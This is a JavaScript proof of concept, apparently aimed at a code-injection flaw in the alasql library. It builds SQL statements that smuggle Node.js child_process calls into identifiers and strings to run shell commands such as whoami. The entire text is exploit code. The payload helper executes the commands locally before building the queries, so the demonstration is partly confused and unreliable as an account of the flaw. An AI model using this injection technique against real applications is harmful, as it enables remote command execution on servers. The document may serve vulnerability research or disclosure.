const genPayload = command => 
  new Function(
    'return this.process.mainModule.require'
  )()('child_process').execSync(`${command}`).toString().trim();  // execSync 실행 결과를 문자열로 변환하고 앞뒤 공백 제거

alasql('CREATE table i_am_a_table;' +
    'INSERT INTO i_am_a_table VALUES (1337);' +

    // whoami의 결과값을 42 대신에 넣기
    `UPDATE i_am_a_table SET [0'+${genPayload("whoami")}+'] = '${genPayload("whoami")}';` +  // whoami 결과를 테이블에 저장
    `SELECT * from i_am_a_table where whatever=['+${genPayload(">&2 echo SELECT pwned $(whoami)")}+'];` +
    `SELECT \'+${genPayload(">&2 echo SELECT pwned again, back-quote works too. $(whoami)")}+'\ from i_am_a_table where 1;` +
    `SELECT [whatever||${genPayload('>&2 echo calling function pwned')}||]('whatever');`
);
